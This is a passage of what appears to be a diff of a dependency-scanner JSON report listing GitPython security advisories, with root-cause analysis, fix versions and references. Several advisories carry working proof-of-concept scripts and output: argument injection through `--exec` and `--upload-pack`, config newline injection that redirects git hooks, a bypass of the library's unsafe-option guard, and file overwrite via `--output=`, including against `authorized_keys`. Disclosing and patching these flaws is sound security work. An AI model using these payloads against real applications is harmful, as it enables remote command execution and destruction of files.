`Repo.archive` already documents user-facing kwargs (`format`, `prefix`, `path`), so forwarding a caller options mapping is an expected usage. Final argv:\n\n```\ngit archive --remote=. --exec=<cmd> -- <treeish>\n```\n\n`git archive --remote=<repo>` runs the upload-archive helper; `--exec=<cmd>` overrides the helper path, executing `<cmd>` on the host. This works with **default Git config** — it does not rely on the `ext::` transport (which is blocked by default).\n\n### 2. `repo.git.ls_remote(..., upload_pack=...)` — command execution (dynamic builder, `git/cmd.py:1487`)\n\n`transform_kwarg` dashifies `upload_pack` → `--upload-pack=<value>`. `git ls-remote <local-repo> --upload-pack=<cmd>` executes `<cmd>`. The dynamic builder makes **both** the flag name and value caller-controlled (`repo.git.<anything>(**user_dict)`), and `ls_remote` has no `check_unsafe_options`.\n\nThis is exactly the underscore-kwarg-vs-hyphen-kwarg gap that CVE-2026-42215 fixed for `fetch`/`pull`/`push`/`clone_from` — but `ls_remote` and the rest of the dynamic surface were left unpatched.\n\n### 3. `Repo.iter_commits` / `Repo.blame` — arbitrary file overwrite (`git/objects/commit.py:348`, `git/repo/base.py:1199`)\n\n```python\n# Commit.iter_items (reached via Repo.iter_commits)\nproc = repo.git.rev_list(rev, args_list, as_process=True, **kwargs)   # args_list == [\"--\", *paths]\n```\n\n```python\n# Repo.blame\ndata = self.git.blame(rev, *rev_opts, \"--\", file, p=True, stdout_as_string=False, **kwargs)\n```\n\n`rev` is placed **before** `--`, with no leading-dash check anywhere in the path. A caller passing `rev=\"--output=/path\"` (a value that looks like an ordinary ref/branch/tag string an app forwards from user input) produces:\n\n```\ngit rev-list --output=/path --\n```\n\n`git rev-list`/`log`/`blame` honour `--output=<file>`, which `open()`s and truncates the file *before* validating the revision — so the file is destroyed even though Git then errors out on the bad revision.\n\n## PoC\n\nAll three PoCs are self-contained, run against the released **GitPython 3.1.50** under **default Git configuration**, and were executed live (git 2.51.0). Each prints a host-side marker proving the effect.\n\n### Install\n\n```bash\npython3 -m venv venv && . venv/bin/activate\npip install GitPython           # resolves to 3.1.50\npython -c \"import git; print(git.__version__)\"   # 3.1.50\n```\n\n### PoC 1 — command execution via `Repo.archive`\n\n```python\n# archive_rce.py\nimport io, os, tempfile, subprocess, git\n\nd = tempfile.mkdtemp()\nsubprocess.run(['git','init','-q',d], check=True)\nsubprocess.run(['git','-C',d,'-c','user.email=a@b.c','-c','user.name=a',\n                'commit','-q','--allow-empty','-m','init'], check=True)\nrepo = git.Repo(d)\n\nmarker = os.path.join(tempfile.gettempdir(), 'gp_rce_marker')\nif os.path.exists(marker): os.remove(marker)\n\n# a service lets a user export a repo and forwards their options dict\nopts = {'remote': '.', 'exec': 'touch ' + marker}\ntry:\n    repo.archive(io.BytesIO(), **opts)\nexcept git.exc.GitCommandError as e:\n    print('[*] git exited non-zero (expected), but the exec already ran:', str(e).splitlines()[0][:60])\n\nprint('[+] marker present:', os.path.exists(marker))\n```\n\nVerbatim output:\n\n```\n[*] git exited non-zero (expected), but the exec already ran: Cmd('git') failed due to: exit code(128)\n[+] marker present: True\n```\n\n`git config --get protocol.ext.allow` returns nothing (unset = default), confirming no special config is required.\n\n### PoC 2 — command execution via `git.ls_remote(upload_pack=...)`\n\n```python\n# lsremote_rce.py\nimport os, tempfile, subprocess, git\nd = tempfile.mkdtemp()\nsubprocess.run(['git','init','-q',d], check=True)\nsubprocess.run(['git','-C',d,'-c','user.email=a@b.c','-c','user.name=a','commit','-q','--allow-empty','-m','init'], check=True)\nrepo = git.Repo(d)\nmarker = os.path.join(tempfile.gettempdir(),'gp_lsr_marker')\nif os.path.exists(marker): os.remove(marker)\ntry:\n    repo.git.ls_remote('.', upload_pack='touch '+marker+';')\nexcept git.exc.GitCommandError as e:\n    print('[*] git err:', str(e).splitlines()[0][:50])\nprint('[+] ls-remote marker present:', os.path.exists(marker))\n```\n\nVerbatim output:\n\n```\n[*] git err: Cmd('git') failed due to: exit code(128)\n[+] ls-remote marker present: True\n```\n\n### PoC 3 — arbitrary file overwrite via a benign-looking `rev`\n\n```python\n# itercommits_filewrite.py\nimport os, tempfile, subprocess, git\nd = tempfile.mkdtemp()\nsubprocess.run(['git','init','-q',d], check=True)\nsubprocess.run(['git','-C',d,'-c','user.email=a@b.c','-c','user.name=a','commit','-q','--allow-empty','-m','init'], check=True)\nrepo = git.Repo(d)\nvictim = os.path.join(tempfile.gettempdir(),'gp_fw_victim')\nopen(victim,'w').write('do not delete\\n')\nprint('[*] before:', repr(open(victim).read()))\nuser_ref = '--output=' + victim          # value an app forwards as a \"ref/branch\"\ntry:\n    list(repo.iter_commits(user_ref))\nexcept git.exc.GitCommandError as e:\n    print('[*] git err (after open+truncate):', str(e).splitlines()[0][:50])\nprint('[+] after :', repr(open(victim).read()), '<- truncated')\n```\n\nVerbatim output:\n\n```\n[*] before: 'do not delete\\n'\n[*] git err (after open+truncate): Cmd('git') failed due to: exit code(129)\n[+] after : '' <- truncated\n```",
-        "fixedVersion": "3.1.51",
-        "affectedRange": ">=0,<3.1.51",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2026-07-21T20:10:06Z",
-        "modified": "2026-08-02T03:56:47.832026599Z",
-        "references": [
-          "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-956x-8gvw-wg5v",
-          "https://github.com/gitpython-developers/GitPython/pull/2163",
-          "https://github.com/gitpython-developers/GitPython/commit/701ce32fe5ba8cb622c0e0342a376a6beb47d738",
-          "https://github.com/gitpython-developers/GitPython",
-          "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.51"
-        ]
-      },
-      {
-        "name": "gitpython",
-        "ecosystem": "PyPI",
-        "version": "3.1.40",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/gitpython@3.1.40",
-        "cveIds": [],
-        "aliases": [
-          "GHSA-fjr4-x663-mwxc"
-        ],
-        "cweIds": [
-          "CWE-88"
-        ],
-        "severity": "HIGH",
-        "cvssScore": 8.1,
-        "summary": "GitPython: Arbitrary file overwrite via git diff --output argument injection in Diffable.diff (key- and value-controlled)",
-        "details": "## Summary\n`Diffable.diff()` forwards `**kwargs` straight into `diff`/`diff_tree` with **no** `check_unsafe_options` guard. `Diffable` is mixed into `Commit`, `Tree`, `IndexFile`, and `Submodule`, giving a broad surface. `git diff --output=<path>` writes real patch content to an attacker-chosen path, enabling arbitrary file overwrite.\n\n## Root Cause\n`diff.py:188-283` builds and runs the diff command with no `check_unsafe_options` anywhere in the method (grep-confirmed). Additionally `diff.py:265` does `args.insert(0, other)`, placing the caller-supplied `other` ref BEFORE the `--` separator, so a value of `--output=/path` is parsed by git as an option — a value-only control path requiring no kwarg key.\n\n## Impact\nOverwrite/corrupt any file at process privilege with attacker-chosen path (e.g. `~/.ssh/authorized_keys`, configs, lockfiles). Content is real diff/patch bytes (attacker-influenced). Per the skill's rule, controlling WHICH file is overwritten = I:H regardless of content constraints.\n\n## Proof of Concept\n```python\n# Key-control:\ncommit.diff(other_commit, output='/home/app/.ssh/authorized_keys')   # victim overwritten with diff (105 bytes verified)\n# Value-control (attacker controls only the ref string):\ncommit.diff(other='--output=/home/app/.ssh/authorized_keys')          # 14-byte victim -> 146 bytes of diff-tree output\n```\n\n## Attack Chain\n1. Entry (value-control): `commit.diff(other=<user ref>)` with `other = \"--output=/home/app/.ssh/authorized_keys\"`. Guard: none in `Diffable.diff`. Bypass proof: no `check_unsafe_options` in the method body (grep); `other` inserted pre-`--` at diff.py:265.\n2. Sink: `git diff-tree <sha> --output=/home/app/.ssh/authorized_keys -r ...` -> git opens+truncates the target then writes diff content. Impact: overwrite/corrupt any file at process privilege (attacker chooses the path). Verified argv and victim overwrite live.\n\n## Bypass Evidence\nLive-verified on HEAD (tag 3.1.53): both key-control (`output=`) and value-control (`other='--output=...'`) overwrote a victim file with real diff-tree content; argv confirmed `['git','diff-tree','<sha>','--output=/victim','-r',...]`. This is the same value-control model GHSA-956x deemed fix-worthy for `iter_commits(rev='--output=')` — but `diff` is a distinct, unguarded sink NOT touched by that fix.\n\n## Affected Versions\n`<= 3.1.53`\n\n## Suggested Fix\nAdd `check_unsafe_options` to `Diffable.diff` (mirroring `iter_commits`/`archive`), and/or place `--end-of-options` before the `other` ref so it cannot be parsed as an option.\n\n---\nReported by **zx (Jace)** — GitHub: @manus-use",
-        "fixedVersion": "3.1.54",
-        "affectedRange": ">=0,<3.1.54",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2026-07-24T16:41:20Z",
-        "modified": "2026-07-25T21:44:39.974035175Z",
-        "references": [
-          "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-fjr4-x663-mwxc",
-          "https://github.com/gitpython-developers/GitPython/pull/2180",
-          "https://github.com/gitpython-developers/GitPython/commit/1d51b891d7f236044a6aa17498ec682b63dad6e6",
-          "https://github.com/gitpython-developers/GitPython",
-          "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.54"
-        ]
-      },
-      {
-        "name": "gitpython",
-        "ecosystem": "PyPI",
-        "version": "3.1.40",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/gitpython@3.1.40",
-        "cveIds": [
-          "CVE-2026-67326"
-        ],
-        "aliases": [
-          "GHSA-mv93-w799-cj2w"
-        ],
-        "cweIds": [
-          "CWE-20"
-        ],
-        "severity": "HIGH",
-        "cvssScore": 7.0,
-        "summary": "GitPython: Newline injection in config_writer() section parameter bypasses CVE-2026-42215 patch, enabling RCE via core.hooksPath",
-        "details": "Summary\n\nThe patch for CVE-2026-42215 (GitPython 3.1.49) validates newlines only in the value parameter of set_value(). The section and option parameters are passed to configparser without any newline validation. An attacker who controls the section argument can inject \\n to write arbitrary section headers into .git/config, including a forged [core] section with hooksPath pointing to an attacker-controlled directory, leading to RCE when any git hook is triggered.\n\nDetails\n\nFile: git/config.py — GitPython 3.1.49 (latest patched version)\n\n```python\n  def set_value(self, section: str, option: str, value) -> \"GitConfigParser\":\n      value_str = self._value_to_string_safe(value)   # only value is validated\n      if not self.has_section(section):\n          self.add_section(section)                    # section not validated\n      super().set(section, option, value_str)          # option not validated\n      return self\n```\n\n_write() formats section headers as \"[%s]\\n\" % name. When section = \"user]\\n[core\", this writes [user]\\n[core]\\n — two valid section headers — into .git/config.\n\nPoC\n\n```python\n  import git, os, subprocess\n\n  repo = git.Repo.init(\"/tmp/bypass_test\")\n\n  os.makedirs(\"/tmp/evil_hooks\", exist_ok=True)\n  with open(\"/tmp/evil_hooks/pre-commit\", \"w\") as f:\n      f.write(\"#!/bin/sh\\nid > /tmp/rce_proof.txt\\n\")\n  os.chmod(\"/tmp/evil_hooks/pre-commit\", 0o755)\n\n  # Inject newline into section parameter (not value — already patched)\n  with repo.config_writer() as cw:\n      cw.set_value(\"user]\\n[core\", \"hooksPath\", \"/tmp/evil_hooks\")\n\n  r = subprocess.run([\"git\", \"-C\", \"/tmp/bypass_test\", \"config\", \"core.hooksPath\"],\n                     capture_output=True, text=True)\n  print(r.stdout.strip())  # → /tmp/evil_hooks\n\n  subprocess.run([\"git\", \"-C\", \"/tmp/bypass_test\", \"commit\", \"--allow-empty\", \"-m\", \"x\"])\n  print(open(\"/tmp/rce_proof.txt\").read())  # → uid=1000(...) RCE confirmed\n```\n\nImpact\n\nSame attack outcome as CVE-2026-42215 (RCE via core.hooksPath injection). The patch is incomplete — only value is validated while section and option remain injectable.",
-        "fixedVersion": "3.1.50",
-        "affectedRange": ">=0,<3.1.50",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2026-05-08T23:19:02Z",
-        "modified": "2026-08-02T03:56:45.346497199Z",
-        "references": [
-          "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-mv93-w799-cj2w",
-          "https://github.com/advisories/GHSA-rpm5-65cw-6hj4",
-          "https://github.com/gitpython-developers/GitPython"
-        ]
-      },
-      {
-        "name": "gitpython",
-        "ecosystem": "PyPI",
-        "version": "3.1.40",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/gitpython@3.1.40",
-        "cveIds": [],
-        "aliases": [
-          "GHSA-p538-c434-8v24"
-        ],
-        "cweIds": [
-          "CWE-88"
-        ],
-        "severity": "MEDIUM",
-        "cvssScore": 5.4,
-        "summary": "GitPython: Arbitrary file truncation via git rev-list --output argument injection in unguarded Commit.count",
-        "details": "## Summary\n`Commit.count()` forwards `**kwargs` into `rev_list` with **no** `check_unsafe_options` guard (the guard exists only in the sibling `iter_items`, commit.py:341). `git rev-list --output=<path>` opens and truncates the target file to 0 bytes before revision parsing, so `count(output='/victim')` destroys/blanks an arbitrary file.\n\n## Root Cause\n`commit.py:290-291` calls `self.repo.git.rev_list(self.hexsha, **kwargs)` with no `check_unsafe_options` and no `allow_unsafe_options` parameter. The sibling `iter_items` (commit.py:341) is guarded; `count` is not. This is a distinct, uncovered sink — GHSA-956x-8gvw-wg5v fixed `iter_commits`/`blame`, not `count`.\n\n## Impact\nDestroy/blank an arbitrary file at process privilege (integrity/availability). Reachability is key-control only (`count` uses `self.hexsha`, not a user ref), and the write is a 0-byte truncation (no content control), so MEDIUM.\n\n## Proof of Concept\n```python\ncommit.count(output='/path/to/victim')   # victim truncated to 0 bytes (verified)\n# control: commit.iter_commits(output=...) raises UnsafeOptionError\n```\n\n## Attack Chain\n1. Entry: app forwards user options -> `commit.count(output='/victim')`. Guard: none. Bypass proof: `iter_commits(output=)` raises UnsafeOptionError; `count(output=)` does not — verified side-by-side.\n2. Sink: `git rev-list <sha> --output=/victim` -> file truncated to 0 bytes. Impact: destroy/blank arbitrary file.\n\n## Bypass Evidence\nLive-verified on HEAD (tag 3.1.53): `count(output=<victim>)` truncated a pre-existing file to 0 bytes; guarded `iter_commits(output=)` raised UnsafeOptionError. Same CNA-accepted \"app forwards user options dict\" model as GHSA-956x-8gvw-wg5v's `archive(**kwargs)`. Uncovered sink, not a duplicate.\n\n## Affected Versions\n`<= 3.1.53`\n\n## Suggested Fix\nAdd `check_unsafe_options` to `Commit.count` (mirroring `iter_items`).\n\n---\nReported by **zx (Jace)** — GitHub: @manus-use",
-        "fixedVersion": "3.1.56",
-        "affectedRange": ">=0,<3.1.56",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2026-08-03T20:23:17Z",
-        "modified": "2026-08-03T20:30:18.342261388Z",
-        "references": [
-          "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-p538-c434-8v24",
-          "https://github.com/gitpython-developers/GitPython/pull/2184",
-          "https://github.com/gitpython-developers/GitPython/commit/38553b6fddc7f6a667cdb45a6762343a08fc72b2",
-          "https://github.com/gitpython-developers/GitPython",
-          "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.56"
-        ]
-      },
-      {
-        "name": "gitpython",
-        "ecosystem": "PyPI",
-        "version": "3.1.40",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/gitpython@3.1.40",
-        "cveIds": [],
-        "aliases": [
-          "GHSA-r9mr-m37c-5fr3"
-        ],
-        "cweIds": [
-          "CWE-78",
-          "CWE-88"
-        ],
-        "severity": "HIGH",
-        "cvssScore": 8.8,
-        "summary": "GitPython: Unsafe git option guard bypass via single-character kwarg value token smuggling enables arbitrary command execution",
-        "details": "## Summary\nGitPython's `check_unsafe_options` guard (the control introduced by CVE-2026-42215 / GHSA-2f96 and hardened since) can be bypassed for **every** guarded method (`clone`/`clone_from`, `fetch`/`pull`/`push`, `ls_remote`, `iter_commits`, `blame`, `archive`) by smuggling an option token inside the VALUE of a single-character kwarg. In the default `allow_unsafe_options=False` configuration this yields arbitrary command execution via `--upload-pack`.\n\n## Root Cause\nThe guard builds its candidate option list from kwarg KEYS only: `_option_candidates([], {\"n\":\"--upload-pack=<cmd>\"})` returns `['-n']` (cmd.py:1042-1046 derives the candidate from the key, never the value). `-n` is not on the denylist, so `check_unsafe_options` passes. But `transform_kwarg('n', value, split_single_char_options=True)` (cmd.py:1600-1606) emits **two** argv tokens `['-n', '--upload-pack=<cmd>']`. git then parses the second token as `--upload-pack` and executes the attacker-supplied command. The guard never inspects the value that becomes a separate argv token.\n\n## Impact\nArbitrary OS command execution as the host process (via `--upload-pack`) in the default configuration, affecting all guarded methods since they all build candidates through the name-only `_option_candidates`.\n\n## Proof of Concept\n```python\nfrom git import Repo\nRepo.clone_from(bare_repo, out_dir, n=\"--upload-pack=touch /tmp/ACE;git-upload-pack\")\n# /tmp/ACE created -> ACE. Direct-name form upload_pack=\"...\" is correctly BLOCKED.\n```\nFile-write variant on a guarded revision command: `iter_commits('HEAD', g='--output=/path')` -> candidate `['-g']` passes, argv `['-g','--output=/path']`, victim file truncated.\n\n## Attack Chain\n1. Entry: app forwards a user-supplied options dict -> `Repo.clone_from(url, path, n=\"--upload-pack=touch /tmp/ACE;git-upload-pack\")`. Guard: `check_unsafe_options(options=_option_candidates([], kwargs), unsafe=unsafe_git_clone_options)` at base.py. Bypass proof: `_option_candidates([], {\"n\":\"--upload-pack=...\"})` -> `['-n']` (key-only), not on denylist -> no UnsafeOptionError (verified live).\n2. Transform: `transform_kwarg('n', value, split_single_char_options=True)` -> `['-n', '--upload-pack=touch /tmp/ACE;git-upload-pack']`. Guard: none (guard already passed on name-only candidate). Bypass proof: verified transform emits two tokens.\n3. Sink: `git clone -n --upload-pack='touch ...;git-upload-pack' -- <src> <dst>`; git parses and runs the second token. Impact: ACE (marker created, verified end-to-end).\n\n## Bypass Evidence\nLive-verified on HEAD (tag 3.1.53): `_option_candidates` returns key-only candidate `['-n']`; `transform_kwargs` emits the smuggled `--upload-pack=` token; clone_from with the payload created the marker file; the direct-name `upload_pack=` form raised UnsafeOptionError. All prior bypasses (GHSA-rpm5 underscore key, GHSA-2f96 long-option abbreviation, GHSA-v396 joined short option, GHSA-x2qx multi-before-split) are BLOCKED on HEAD — this is a distinct kwarg-value->separate-token vector.\n\n## Affected Versions\n`<= 3.1.53`\n\n## Suggested Fix\nMake `_option_candidates` also emit candidates derived from single-character kwarg VALUES when `split_single_char_options` is in effect, OR run `check_unsafe_options` over the fully-transformed argv rather than the reconstructed name-only candidate list.\n\n---\nReported by **zx (Jace)** — GitHub: @manus-use",
-        "fixedVersion": "3.1.54",
-        "affectedRange": ">=0,<3.1.54",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2026-07-24T16:42:57Z",
-        "modified": "2026-07-25T21:44:41.709665254Z",
-        "references": [
-          "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-r9mr-m37c-5fr3",
-          "https://github.com/gitpython-developers/GitPython/pull/2180",
-          "https://github.com/gitpython-developers/GitPython/commit/e8d0fbf774d1f6baa3b481adfe48bd262e43b453",
-          "https://github.com/gitpython-developers/GitPython",
-          "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.54"
-        ]
-      },
-      {
-        "name": "gitpython",
-        "ecosystem": "PyPI",
-        "version": "3.1.40",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/gitpython@3.1.40",
-        "cveIds": [
-          "CVE-2026-42215"
-        ],
-        "aliases": [
-          "GHSA-rpm5-65cw-6hj4",
-          "PYSEC-2026-2160"
-        ],
-        "cweIds": [
-          "CWE-78"
-        ],
-        "severity": "HIGH",
-        "cvssScore": 8.8,
-        "summary": "GitPython has Command Injection via Git options bypass",
-        "details": "### Summary\nGitPython blocks dangerous Git options such as `--upload-pack` and `--receive-pack` by default, but the equivalent Python kwargs `upload_pack` and `receive_pack` bypass that check. If an application passes attacker-controlled kwargs into `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`, this leads to arbitrary command execution even when `allow_unsafe_options` is left at its default value of `False`.\n\n### Details\nGitPython explicitly treats helper-command options as unsafe because they can be used to execute arbitrary commands:\n\n- `git/repo/base.py:145-153` marks clone options such as `--upload-pack`, `-u`, `--config`, and `-c` as unsafe.\n- `git/remote.py:535-548` marks fetch/pull/push options such as `--upload-pack`, `--receive-pack`, and `--exec` as unsafe.\n\nThe vulnerable API paths check the raw kwarg names before they're its normalized into command-line flags:\n\n- `Repo.clone_from()` checks `list(kwargs.keys())` in `git/repo/base.py:1387-1390`\n- `Remote.fetch()` checks `list(kwargs.keys())` in `git/remote.py:1070-1071`\n- `Remote.pull()` checks `list(kwargs.keys())` in `git/remote.py:1124-1125`\n- `Remote.push()` checks `list(kwargs.keys())` in `git/remote.py:1197-1198`\n\nThat validation is performed by `Git.check_unsafe_options()` in `git/cmd.py:948-961`. The validator correctly blocks option names such as `upload-pack`, `receive-pack`, and `exec`.\n\nLater, GitPython converts Python kwargs into Git command-line flags in `Git.transform_kwarg()` at `git/cmd.py:1471-1484`. During that step, underscore-form kwargs are dashified:\n\n- `upload_pack=...` becomes `--upload-pack=...`\n- `receive_pack=...` becomes `--receive-pack=...`\n\nBecause the unsafe-option check runs before this normalization, underscore-form kwargs bypass the safety check even though they become the exact dangerous Git flags that the code is supposed to reject.\n\nIn practice:\n\n- `remote.fetch(**{\"upload-pack\": helper})` is blocked with `UnsafeOptionError`\n- `remote.fetch(upload_pack=helper)` is allowed and reaches helper execution\n\nThe same bypass works for:\n\n```python\nRepo.clone_from(origin, out, upload_pack=helper)\nrepo.remote(\"origin\").fetch(upload_pack=helper)\nrepo.remote(\"origin\").pull(upload_pack=helper)\nrepo.remote(\"origin\").push(receive_pack=helper)\n```\n\nThis does not appear to affect every unsafe option. For example, `exec=` is already rejected because the raw kwarg name `exec` matches the blocked option name before normalization.\n\nExisting tests cover the hyphenated form, not the vulnerable underscore form. For example:\n\n- `test/test_clone.py:129-136` checks `{\"upload-pack\": ...}`\n- `test/test_remote.py:830-833` checks `{\"upload-pack\": ...}`\n- `test/test_remote.py:968-975` checks `{\"receive-pack\": ...}`\n\nThose tests correctly confirm the literal Git option names are blocked, but they do not exercise the normal Python kwarg spelling that bypasses the guard.\n\n### PoC\n1. Create and activate a virtual environment in the repository root:\n\n```bash\npython3 -m venv .venv-sec\n.venv-sec/bin/pip install setuptools gitdb\nsource ./.venv-sec/bin/activate\n```\n\n2. make a new python file and put the following in there, then run it:\n\n```python\nimport os\nimport stat\nimport subprocess\nimport tempfile\n\nfrom git import Repo\nfrom git.exc import UnsafeOptionError\n\n# Setup: create isolated repositories so the PoC uses a normal fetch flow.\nbase = tempfile.mkdtemp(prefix=\"gp-poc-risk-\")\norigin = os.path.join(base, \"origin.git\")\nproducer = os.path.join(base, \"producer\")\nvictim = os.path.join(base, \"victim\")\nproof = os.path.join(base, \"proof.txt\")\nwrapper = os.path.join(base, \"wrapper.sh\")\n\n# Setup: this wrapper is just to demo things you can do, not required for the exploit to work\n# you could also do something like an SSH reverse shell, really anything\nwith open(wrapper, \"w\") as f:\n    f.write(f\"\"\"#!/bin/sh\n{{\n  echo \"code_exec=1\"\n  echo \"whoami=$(id)\"\n  echo \"cwd=$(pwd)\"\n  echo \"uname=$(uname -a)\"\n  printf 'argv='; printf '<%s>' \"$@\"; echo\n  env | grep -E '^(HOME|USER|PATH|SSH_AUTH_SOCK|CI|GITHUB_TOKEN|AWS_|AZURE_|GOOGLE_)=' | sed 's/=.*$/=<redacted>/' || true\n}} > '{proof}'\nexec git-upload-pack \"$@\"\n\"\"\")\nos.chmod(wrapper, stat.S_IRWXU)\n\nsubprocess.run([\"git\", \"init\", \"--bare\", origin], check=True, stdout=subprocess.DEVNULL)\nsubprocess.run([\"git\", \"clone\", origin, producer], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\nwith open(os.path.join(producer, \"README\"), \"w\") as f:\n    f.write(\"x\")\n\nsubprocess.run([\"git\", \"-C\", producer, \"add\", \"README\"], check=True, stdout=subprocess.DEVNULL)\nsubprocess.run(\n    [\"git\", \"-C\", producer, \"-c\", \"user.name=t\", \"-c\", \"user.email=t@t\", \"commit\", \"-m\", \"init\"],\n    check=True,\n    stdout=subprocess.DEVNULL,\n)\nsubprocess.run([\"git\", \"-C\", producer, \"push\", \"origin\", \"HEAD\"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\nsubprocess.run([\"git\", \"clone\", origin, victim], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\nrepo = Repo(victim)\nremote = repo.remote(\"origin\")\n\n# the literal Git option name is properly blocked.\ntry:\n    remote.fetch(**{\"upload-pack\": wrapper})\n    print(\"control=unexpected_success\")\nexcept UnsafeOptionError:\n    print(\"control=blocked\")\n\n# this is the actual vulnerability\n# you can also just do upload_pack=\"touch /tmp/proof\", the wrapper is just to show greater impact\n# if you do the \"touch /tmp/proof\" the script will crash, but the file will have been created\nremote.fetch(upload_pack=wrapper)\n\n# Proof: the helper ran as the GitPython host process.\nprint(\"proof_exists\", os.path.exists(proof), proof)\nprint(open(proof).read())\n```\n\n3. Expected result:\n\n- The script prints `control=blocked`\n- The script prints `proof_exists True ...`\n- The proof file contains evidence that the attacker-controlled helper executed as the local application account, including `id`, working directory, argv, and selected environment variable names\n\nExample output:\n\n```bash\nGitPython % python3 test.py\ncontrol=blocked\nproof_exists True /var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/proof.txt\ncode_exec=1\nwhoami=uid=501(wes) gid=20(staff) <redacted>\ncwd=/private/var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/victim\nuname=Darwin  <redacted> Darwin Kernel Version  <redacted>; root:xnu-11417. <redacted>\nargv=</var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/origin.git>\nUSER=<redacted>\nSSH_AUTH_SOCK=<redacted>\nPATH=<redacted>\nHOME=<redacted>\n```\n\nThis PoC does not require a malicious repository. The PoC uses that fresh blank repository. The only attacker-controlled input is the kwarg that GitPython turns into `--upload-pack`.\n\n### Impact\nWho is impacted:\n- Web applications that let users configure repository import, sync, mirroring, fetch, pull, or push behavior\n- Systems that accept a user-provided dict of \"extra Git options\" and pass it into GitPython with `**kwargs`\n- CI/CD systems, workers, automation bots, or internal tools that build GitPython calls from untrusted integration settings or job definitions (yaml, json, etc configs )\n\nWhat the attacker needs to control:\n\n- A value that becomes `upload_pack` or `receive_pack` in the kwargs passed to `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`\n\nFrom a severity perspective, this could lead to\n- Theft of SSH keys, deploy credentials, API tokens, or cloud credentials available to the process\n- Modification of repositories, build outputs, or release artifacts\n- Lateral movement from CI/CD workers or automation hosts\n- Full compromise of the worker or service process handling repository operations\n\nThe highest-risk environments are network-reachable services and automation systems that expose these GitPython kwargs across a trust boundary while relying on the default unsafe-option guard for protection.",
-        "fixedVersion": "3.1.47",
-        "affectedRange": ">=3.1.30,<3.1.47",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2026-04-25T23:42:16Z",
-        "modified": "2026-07-13T07:26:42.486885613Z",
-        "references": [
-          "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rpm5-65cw-6hj4",
-          "https://nvd.nist.gov/vuln/detail/CVE-2026-42215",
-          "https://github.com/gitpython-developers/GitPython",
-          "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.47"
-        ]
-      },
-      {
-        "name": "gitpython",
-        "ecosystem": "PyPI",
-        "version": "3.1.40",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/gitpython@3.1.40",
-        "cveIds": [
-          "CVE-2026-67322"
-        ],
-        "aliases": [
-          "GHSA-rwj8-pgh3-r573"
-        ],
-        "cweIds": [
-          "CWE-200",
-          "CWE-201"
-        ],
-        "severity": "HIGH",
-        "cvssScore": 7.5,
-        "summary": "GitPython: Environment-variable exfiltration via os.path.expandvars() on Repo.clone_from() URL",
-        "details": "### Summary\n`Repo.clone_from()` passes the caller-supplied remote URL through `Git.polish_url()`, which on every non-Cygwin platform calls `os.path.expandvars()` on the URL before handing it to `git clone`. An attacker who controls the URL argument — the documented use case for `clone_from()` in \"import repository from URL\" features of CI servers, git-hosting mirrors, and dependency scanners — can embed `$NAME` / `${NAME}` tokens that are expanded server-side to the values of the hosting process's environment variables. The resulting URL, now containing the secret, is transmitted over the network to the attacker-named host. This crosses the trust boundary between an untrusted remote URL and the server's process environment, disclosing secrets such as `AWS_SECRET_ACCESS_KEY` or `GITHUB_TOKEN` with no precondition beyond the ability to submit a clone URL.\n\n### Details\n**Affected versions:** `gitpython` (PyPI) — all releases up to and including `3.1.50` (latest at time of reporting); confirmed present on the `main` branch.\n\n`Git.polish_url()` unconditionally applies environment-variable expansion to its input on the non-Cygwin branch:\n\n`git/cmd.py` (v3.1.50), lines 907–925:\n```python\n@classmethod\ndef polish_url(cls, url: str, is_cygwin: Union[None, bool] = None) -> PathLike:\n    \"\"\"Remove any backslashes from URLs to be written in config files.\n    ...\n    \"\"\"\n    if is_cygwin is None:\n        is_cygwin = cls.is_cygwin()\n\n    if is_cygwin:\n        url = cygpath(url)\n    else:\n        url = os.path.expandvars(url)          # <-- line 921\n        if url.startswith(\"~\"):\n            url = os.path.expanduser(url)\n        url = url.replace(\"\\\\\\\\\", \"\\\\\").replace(\"\\\\\", \"/\")\n    return url\n```\n\n`Repo._clone()` — reached from the public `Repo.clone_from()` (`git/repo/base.py:1520`) and `Repo.clone()` — runs the unsafe-protocol check on the **raw** URL and then passes the **polished** (post-expansion) URL to the `git clone` subprocess:\n\n`git/repo/base.py` (v3.1.50), lines 1407–1418:\n```python\nif not allow_unsafe_protocols:\n    Git.check_unsafe_protocols(url)\nif not allow_unsafe_options:\n    